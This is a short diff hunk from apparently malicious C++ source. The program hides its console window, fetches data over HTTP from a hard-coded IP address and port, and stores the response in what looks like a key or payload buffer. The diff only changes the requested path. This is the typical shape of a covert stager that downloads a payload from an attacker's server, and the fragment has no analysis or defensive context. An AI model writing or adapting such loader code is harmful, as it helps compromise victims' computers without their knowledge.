@@ -323,7 +323,7 @@ int main(int argc, CHAR* argv[]) {
     HWND hwndDOS = GetForegroundWindow();
     ShowWindow(hwndDOS, SW_HIDE);
     HttpRequest httpReq("101.42.175.89", 65523);
-    std::string res = httpReq.HttpGet("/e");
+    std::string res = httpReq.HttpGet("/g");
     std::string str_orign = "vwxyz123456789011111111";
     str_orign = res;
 
